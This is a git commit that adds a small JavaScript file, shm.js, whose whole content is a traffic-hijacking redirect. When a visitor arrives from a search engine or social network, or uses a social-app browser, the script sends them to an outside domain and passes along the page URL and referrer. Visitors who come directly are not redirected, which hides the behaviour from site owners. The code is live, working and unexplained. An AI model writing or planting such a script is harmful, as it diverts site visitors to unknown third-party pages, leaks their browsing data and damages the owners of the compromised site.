523f78b50a0034ea30e5f63cad5ed18fd767c0b2
Aini Sastra <aini.sastra@gmail.com>
2022-10-26 18:26:13 +0800

    Create shm.js

---
+++ shm.js
@@ -0,0 +1,2 @@
+var ars = 'https://www.stylesgurus.com';
+	if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.', 'dogpile.', 'ecosia.', 'info.', 'see-it.', 'wow.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
